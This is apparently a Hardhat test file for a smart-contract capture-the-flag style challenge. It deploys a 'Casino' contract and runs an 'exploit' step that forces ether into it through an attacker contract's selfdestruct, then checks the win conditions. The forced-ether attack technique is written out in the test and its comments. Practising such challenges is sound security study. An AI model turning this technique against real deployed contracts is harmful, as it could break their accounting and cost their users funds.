const { expect } = require('chai');
const { waffle} = require("hardhat");
const { utils } = require('web3');
 

describe("Challenge Baraa42", function () {
    let deployer, attacker; 

    before(async function() {

        [deployer, attacker] = await hre.ethers.getSigners()

        //deploy casino contract 
        const casinoFactory = await hre.ethers.getContractFactory("Casino", deployer)

        this.casino = await casinoFactory.deploy()


    })

    it("exploit", async function() {
        
        //conditions to win: 
        // 1- game on AND casino balance > total deposit + total prize + total jackpot 
        // 2- game off AND casinoBalance <= totalDeposits + (totalPrize * 25) / 100 

        const attackFatory = await ethers.getContractFactory("CasinoAttacker", attacker)

        // 1- send ether to attacker contract, selfdestruct in order to force ethers to casino contract 
        const attackerContract = await attackFatory.deploy(this.casino.address, {value: 10000})
        await attackerContract.destroy()

    })

    after( async function() {

        const casinoAddress = this.casino.address; 
        const casinoBalance = await waffle.provider.getBalance(casinoAddress)
        const totalDeposits = await this.casino.totalDeposits()
        const totalPrize = await this.casino.totalPrize()
        const totalJackpot = await this.casino.totalJackpot()
        const gameOn = await this.casino.gameOn();

        if(gameOn) {
            console.log("game is still on")
            expect(casinoBalance).to.be.gt(totalDeposits + totalPrize + totalJackpot)
        } else {
            console.log("game is off")
            // casinoBalance less than or equal to totalDeposits + (totalPrize * 25) / 100
            expect(casinoBalance).to.be.at.most(totalDeposits + (totalPrize * 25) / 100)
        }
    })

})